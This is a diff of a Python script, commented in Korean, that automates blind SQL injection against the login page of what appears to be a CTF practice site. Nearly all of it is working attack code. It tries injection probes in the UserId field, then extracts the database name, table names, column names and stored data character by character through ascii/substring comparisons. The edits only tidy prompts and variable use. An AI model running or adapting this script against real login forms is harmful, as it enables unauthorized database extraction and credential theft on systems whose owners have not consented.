@@ -1,19 +1,17 @@
-# # ID 입력칸에만 사용 가능. (Unique)
+# ID 입력칸에만 사용 가능. (Unique)
+
 import requests
 
-# SQLi 진행하려는 사이트 url
-URL = 'http://ctf.segfaulthub.com:9999/sqli_3/login.php'
-userid = "mario"
-password = "mariosuper"
+URL = 'http://ctf.segfaulthub.com:9999/sqli_3/login.php'            # Blind SQL Injection 공격으 진행하려는 사이트 url
+userid = "mario"                                                    # 사이트에서 로그인 가능한 ID
+password = "mariosuper"                                             # 사이트에서 로그인 가능한 password
 
-Can_SQLi = ["' #", 
+Can_SQLi = ["' #",
             "' and '1'='1", 
             "' and (1=1) and '1'='1", 
             "' and ('test'='test') and '1'='1",
             ]
 for i in Can_SQLi:
-    # mario 대신 로그인 가능한 아이디 입력.
-    # sqlquery = "woosung'
     sqlquery  = userid+i
     postquery = "UserId="+sqlquery+"&Password="+password+"&Submit=Login"
     res  = requests.post(url=URL, data=postquery, headers={"Content-Type": "application/x-www-form-urlencoded"})
@@ -42,6 +40,7 @@ else:
 
 print("format : "+userid+"' and (ascii(substring((SQL), 1,1)) > 0) and '1'='1")
 print("Really going to do SQLi ?")
+print("search database name.")
 ans2 = input(" GO = 1 \n")
 if ans2 == '1':
     sqlidb = userid+"' and (ascii(substring((select database()), 1,1))>0) and '1'='1"
@@ -70,7 +69,7 @@ else:
     print("ok, bye")
     exit()
 
-print("search table name ?")
+print("search table name.")
 ans3 = input(" YES = 1 \n")
 if ans3 == '1':
     sqlitable1 = userid+"' and (ascii(substring((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit 0,1),1,1))>0) and '1'='1"
@@ -110,10 +109,10 @@ else:
     print("ok, bye")
     exit()
 
-print("search column.")
+print("search column name.")
+print('Select the name of the table to find the column name.')
 print(tablelist)
-print('frist. select table ')
-tbname= input('chat table name\n')
+tbname= input('Write down the name of the table\n')
 sqlicolumn1 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit 0,1),1,1))>0) and '1'='1"
 sqlipostquery1 = "UserId="+sqlicolumn1+"&Password="+password+"&Submit=Login"
 res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
@@ -149,32 +148,30 @@ else:
     print("ok, bye")
     exit()
 
-print('frist. select table')
-print(tablelist)
-tableans = input("\n")
-print("second. select column")
+print("search data name.")
+print("select "+tbname+"'s column")
 print(columnlist)
 columnans = input("\n")
-print('table  : '+tableans+'\ncolumn : '+columnans)
+print('table  : '+tbname+'\ncolumn : '+columnans)
 
-sqlidata1 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit 0,1),1,1))>0) and '1'='1"
+sqlidata1 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit 0,1),1,1))>0) and '1'='1"
 sqlipostquery1 = "UserId="+sqlidata1+"&Password="+password+"&Submit=Login"
 res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
 datalist = []
 if "Incorrect" not in res.text:
     for i in range(0, 10):
         dataname = ''
-        sqlidata2 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),1,1))>0) and '1'='1"
+        sqlidata2 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),1,1))>0) and '1'='1"
         sqlipostquery2 = "UserId="+sqlidata2+"&Password="+password+"&Submit=Login"
         res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
         if "Incorrect" not in res.text:
             for j in range(1, 31):
-                sqlidata3 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
+                sqlidata3 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
                 sqlipostquery3 = "UserId="+sqlidata3+"&Password="+password+"&Submit=Login"
                 res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
                 if "Incorrect" not in res.text:
                     for k in range(32, 126):
-                        sqlidata4 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
+                        sqlidata4 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
                         sqlipostquery4 = "UserId="+sqlidata4+"&Password="+password+"&Submit=Login"
                         res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
                         if "Incorrect" not in res.text:
@@ -192,3 +189,5 @@ if "Incorrect" not in res.text:
 else:
     print("ok, bye")
     exit()
+
+# 함수 사용해서 더 간략하게 만들 수 있을 거 같음
